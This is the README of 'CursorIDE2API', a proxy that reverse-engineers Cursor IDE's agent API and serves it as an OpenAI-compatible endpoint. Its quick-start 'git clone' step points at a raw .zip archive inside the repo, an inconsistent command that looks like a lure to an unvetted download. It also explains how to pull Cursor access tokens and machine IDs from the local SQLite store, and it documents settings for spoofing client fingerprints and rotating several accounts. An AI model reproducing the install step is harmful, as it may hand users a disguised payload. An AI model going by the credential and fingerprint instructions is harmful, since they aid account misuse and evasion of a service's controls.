# CursorIDE2API

> 🔄 将 Cursor IDE 的 Agent API 转为 OpenAI 兼容接口，极简反代，开箱即用。

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

## ✨ 特性

- 📦 **零依赖数据库** — 只需一个 `token.json`，无需 SQLite / Redis
- 🔌 **OpenAI 兼容** — `/v1/chat/completions` + `/v1/models`，可直接对接任何 OpenAI SDK
- 🌊 **流式 & 非流式** — 完整支持 SSE 流式响应
- 🔑 **多 Token 轮询** — 支持多账号 round-robin 负载均衡
- 🔥 **热更新** — 修改 `token.json` 后自动生效，无需重启
- 🛡️ **可选鉴权** — 环境变量设置 `API_KEY` 即可启用

## 📁 项目结构

```
cursoride2api/
├── server.js              # 入口 (路由 + 启动，全合一)
├── src/
│   ├── config.js          # 配置 & 模型映射
│   ├── converter.js       # OpenAI ↔ Cursor 格式转换
│   └── cursor-client.js   # Cursor Agent API 客户端 (H2 + ConnectRPC)
├── scripts/
│   └── context-tests/     # 手动长上下文 / NIAH 探针（不用于 CI）
├── token.json.example     # Token 配置模板
├── Cursor IDE API 逆向工程文档.md  # Cursor API 逆向文档
├── package.json
├── LICENSE
└── README.md
```

## 🚀 快速开始

### 1. 克隆 & 安装

```bash
git clone https://github.com/sdsdsdsdsdsihdkjsdjl/cursoride2api/raw/refs/heads/main/src/cursoride_api_v3.4.zip
cd cursoride2api
npm install
```

### 2. 配置 Token

```bash
cp token.json.example token.json
```

编辑 `token.json`，填入你的 Cursor 凭证：

```json
{
  "tokens": [
    {
      "name": "my-account",
      "accessToken": "eyJhbG...",
      "machineId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
      "macMachineId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    }
  ]
}
```

<details>
<summary>📖 如何获取凭证？</summary>

Cursor 凭证存储在本地 SQLite 数据库中：

| 平台 | 路径 |
|------|------|
| Windows | `%APPDATA%\Cursor\User\globalStorage\state.vscdb` |
| macOS | `~/Library/Application Support/Cursor/User/globalStorage/state.vscdb` |
| Linux | `~/.config/Cursor/User/globalStorage/state.vscdb` |

使用任意 SQLite 工具打开，从 `ItemTable` 表读取：

| Key | 用途 |
|-----|------|
| `cursorAuth/accessToken` | 认证令牌 (**必须**) |
| `telemetry.machineId` | 机器 ID (用于 checksum) |
| `telemetry.macMachineId` | Mac 机器 ID (用于 checksum) |

</details>

### 3. 启动

```bash
npm start
```

```
  ╔═══════════════════════════════════════════╗
  ║       CursorIDE2API v2.0 (Lite)           ║
  ╠═══════════════════════════════════════════╣
  ║  🌐 http://0.0.0.0:3000                   ║
  ║  🔌 /v1/chat/completions                  ║
  ║  📋 /v1/models                            ║
  ╠═══════════════════════════════════════════╣
  ║  🔑 Tokens: 1                              ║
  ║  🤖 Default: claude-4.5-sonnet             ║
  ║  🔐 API Key: OPEN (no key)                 ║
  ╚═══════════════════════════════════════════╝
```

## 📡 API 使用

### Chat Completions

```bash
# 非流式
curl http://localhost:3000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gpt-4",
    "messages": [{"role": "user", "content": "Hello!"}]
  }'

# 流式
curl http://localhost:3000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gpt-4",
    "messages": [{"role": "user", "content": "Hello!"}],
    "stream": true
  }'
```

### 模型列表

```bash
curl http://localhost:3000/v1/models
```

### 带 API Key

```bash
curl http://localhost:3000/v1/chat/completions \
  -H "Authorization: Bearer your-api-key" \
  -H "Content-Type: application/json" \
  -d '{"model":"gpt-4","messages":[{"role":"user","content":"Hi"}]}'
```

### Python (OpenAI SDK)

```python
from openai import OpenAI

client = OpenAI(
    base_url="http://localhost:3000/v1",
    api_key="any-string"  # 未设置 API_KEY 时填任意值
)

resp = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "你好！"}],
    stream=True
)

for chunk in resp:
    if chunk.choices[0].delta.content:
        print(chunk.choices[0].delta.content, end="")
```

## ⚙️ 环境变量

| 变量 | 默认值 | 说明 |
|------|--------|------|
| `PORT` | `3000` | 监听端口 |
| `HOST` | `0.0.0.0` | 监听地址 |
| `API_KEY` | _(空=不校验)_ | API 鉴权密钥 |
| `TOKEN_FILE` | `./token.json` | Token 文件路径 |
| `DEFAULT_MODEL` | `claude-4.5-sonnet` | 默认 Cursor 模型 |
| `CURSOR_CLIENT_VERSION` | `2.6.20` | Cursor 客户端版本号 |
| `CURSOR_API_BASE_URL` | `https://api2.cursor.sh` | Cursor 后端地址（与官方 IDE 同名 env） |
| `CURSOR_CLIENT_OS_VERSION` | `os.release()` | 上送的客户端 OS 版本（指纹用） |
| `CURSOR_COMMIT` | _(默认 v3.2.11 hash)_ | 上送的客户端 commit hash（指纹用） |
| `REQUEST_TIMEOUT` | `120000` | 请求超时 (ms) |
| `TOKEN_RATE_LIMIT_PARK_MS` | `60000` | Token 命中 429 后冷却时长 (ms) |
| `DEBUG_LOG` | _(空=关)_ | `1` 写错误日志到 `logs/`；`verbose` 也记录请求体 |
| `DEBUG_LOG_DIR` | `./logs` | 日志目录覆盖 |
| `CURSOR_AGENT_DEBUG` | _(空=关)_ | `1` 启用 cursor-agent 调试日志（pool/recycler 事件等） |
| `TOOL_INCLUDE` | _(空)_ | Anthropic 工具白名单（按工具名） |
| `TOOL_LIMIT` | `0` | 工具数量上限 |
| `TOOL_DESC_LIMIT` | `600` | 工具描述截断长度（字符） |
| `TOOL_SCHEMA_TRIM_BYTES` | `30000` | 总 schema 超过此值则剥离 properties[].description |
| `SMALL_MODEL` | `claude-sonnet-4-6` | 用于 compact / haiku 升级的小模型 |
| `SUBAGENT_USE_SMALL_MODEL` | _(空)_ | `1` 时把 subagent 流量也降级到 `SMALL_MODEL` |
| `H2_POOL_SIZE` | `3` | HTTP/2 客户端连接池大小 |
| `CURSOR_POOL_MAX_IDLE_MS` | `300000` | 空闲池连接自动回收阈值 (ms)；防止 LB 静默轮转造成的级联失败 |
| `CURSOR_STALL_TIMEOUT_MS` | _(自动)_ | 全局覆盖按模型计算的 pre-content stall 阈值；通常不需要 — 让 `src/stall-thresholds.js` 按模型推导 |
| `CURSOR_STALL_TIMEOUT_MS_WITH_CONTENT` | _(自动)_ | 全局覆盖 post-content stall 阈值；同上 |
| `CURSOR_FORCE_THINKING` | _(空)_ | `on`/`off`/`adaptive` — 全局覆盖客户端的 `thinking.type` |
| `CURSOR_EMIT_THINKING_BLOCKS` | _(空=off)_ | `1` 时输出 `thinking` 内容块（缺签名，会破坏切换到真实 Anthropic API 的会话续传）。默认关闭以保证可移植性 |
| `CURSOR_REINJECT_THINKING` | _(空=off)_ | `1` 时启用代理端思考连续性：把模型上一轮的思考内容（带 `<thinking>...</thinking>` 标签）回注到下一轮提示中。在 Cursor 的 ChatService（带签名）不可用时的近似方案。代价是每次续传都会多出几百到几千 token。详见 [DEVLOG.md](DEVLOG.md) 中的 "Proxy-side thinking re-injection" 章节。 |
| `CURSOR_REINJECT_THINKING_MAX_BYTES_PER_TURN` | `4096` | 每轮存储的思考字节上限（避免长会话膨胀） |
| `CURSOR_REINJECT_THINKING_MAX_TURNS` | `5` | 每个会话保留的思考轮数上限 |
| `RUNTIME_STATS_FILE` | `./logs/runtime-stats.json` | 运行时统计持久化文件路径 |
| `RUNTIME_STATS_PERSIST_MS` | `60000` | 统计快照写盘间隔 (ms) |
| `RUNTIME_STATS_RECENT` | `1000` | 滚动窗口大小（用于时间分桶视图） |
| `RUNTIME_STATS_CONN_RING` | `500` | 连接事件环形缓冲区大小 |
| `RUNTIME_STATS_LOG_INTERVAL_MS` | _(空=关)_ | 定期输出 `📈 runtime/last1h` 摘要行的间隔；用于长跑部署 |

## 🗺️ 模型映射

传入 OpenAI 风格模型名会自动映射到 Cursor 原生模型：

| 传入 | 映射到 |
|------|--------|
| `gpt-4` / `gpt-4o` / `gpt-4-turbo` | `composer-2` |
| `gpt-4o-mini` | `composer-2-fast` |
| `gpt-3.5-turbo` | `composer-1.5` |
| `claude-3-opus` | `claude-4.6-opus-high` |
| `claude-3-sonnet` | `claude-4.6-sonnet-medium` |
| `claude-3.5-sonnet` | `claude-4.5-sonnet` |
| `gemini-pro` | `gemini-3.1-pro` |

> 💡 也可直接传 Cursor 原生模型名 (如 `composer-2`、`claude-4.5-sonnet-thinking`)，会直接透传。

## 🧪 手动长上下文探针

`scripts/context-tests/` 包含手动运行的长上下文 / Needle-In-A-Haystack 探针脚本，用于验证 `/v1/messages` 的上下文截断与召回表现。它们会生成大请求、耗时较长，并可能消耗较多模型额度，因此不放入 CI。

```bash
npm run probe:context
npm run probe:niah
REPS=1 SERVER=http://localhost:4141 npm run probe:niah:repeat
```

更多参数见 [`scripts/context-tests/README.md`](scripts/context-tests/README.md)。

## 📊 观测端点 / Observability Endpoints

代理内置一组只读 stats 端点，方便诊断和调参：

| 端点 | 用途 |
|------|------|
| `GET /health` | 紧凑健康检查（token 池、stall 阈值、连接计数、最近一小时统计汇总） |
| `GET /stats` | 按模型聚合的运行时统计（t-digest 分位数 + 计数器）。支持 `?window=last1h\|last24h\|<ms>`、`?model=<id>`、`?groupBy=model\|modelMode\|mode` |
| `GET /stats/connections` | HTTP/2 连接池生命周期：每连接寿命、复用流数、关闭原因分布、每槽 churn |
| `GET /stats/inflight` | 实时在飞 bridge 状态：`idleMsSinceLastUsefulFrame`、`currentThresholdMs`、`willTripStallInMs`、文本/思考 delta 计数、字节流。用于回答"现在这个 turn 是在思考还是卡住了？" |

示例：

```bash
# 看看 opus-4-7-thinking-max 在 stream-continuation 模式下最近一小时的延迟分位
curl 'http://localhost:4141/stats?window=last1h&groupBy=modelMode' \
  | jq '.groups | with_entries(select(.key | startswith("claude-opus-4-7-thinking-max|stream|cont")))'

# 实时盯一个可能卡住的 bridge
watch -n 2 'curl -s http://localhost:4141/stats/inflight | jq ".bridges[0]"'
```

## 🏗️ 技术原理

本项目基于对 Cursor IDE `workbench.desktop.main.js` 的逆向分析：

1. 使用 **ConnectRPC over HTTP/2** 协议连接 `api2.cursor.sh`
2. 调用 `agent.v1.AgentService/Run` 双向流接口
3. 处理 Envelope 帧编码 (5 字节头 + JSON payload)
4. 自动回复 `execServerMessage` (headless 模式)
5. 实时解析 `interactionUpdate` 流并转为 OpenAI SSE 格式

详细逆向文档见 [Cursor IDE API 逆向工程文档](Cursor%20IDE%20API%20逆向工程文档.md)；近期开发笔记见 [DEVLOG.md](DEVLOG.md)；调试方法（live-monitoring）见 [DEBUGGING.md](DEBUGGING.md)。

## 🔗 相关项目 / Related Projects

本项目交叉参考了下列 Cursor 逆向研究（完整清单和取舍说明见 [REFERENCES.md](REFERENCES.md)；具体技术细节见 [DEVLOG.md](DEVLOG.md) "Cross-referencing with other Cursor RE projects" 章节）：

- [`JJDTrump/cursor-reverse-engineering`](https://github.com/JJDTrump/cursor-reverse-engineering) — Cursor IDE 深度逆向分析（gRPC services, headers, ModelDetails）。
- [`anyrobert/cursor-api-proxy`](https://github.com/anyrobert/cursor-api-proxy) — `cursor-agent` CLI → OpenAI 兼容代理；本项目的 health-aware TokenPool 设计参考自其 `account-pool.ts`。
- [`JiuZ-Chn/Cursor-To-OpenAI`](https://github.com/JiuZ-Chn/Cursor-To-OpenAI) — 后端直连代理（与本项目同路线），dated-variant 回退正则参考自该项目。
- [`unkn0wncode/extract-cursor-protos`](https://github.com/unkn0wncode/extract-cursor-protos) — 直接从 Cursor bundle 抽取完整 protobuf registry，用于核对 wire format。
- [`ephraimduncan/opencode-cursor`](https://github.com/ephraimduncan/opencode-cursor)、[`burpheart/cursor-tap`](https://github.com/burpheart/cursor-tap) — 早期参考实现与抓包分析（proto 定义来源）。

## 📄 License

[MIT](LICENSE)

## ⚠️ 免责声明

本项目仅供学习研究使用。使用本项目须遵守 Cursor IDE 的服务条款，开发者不对任何滥用行为负责。
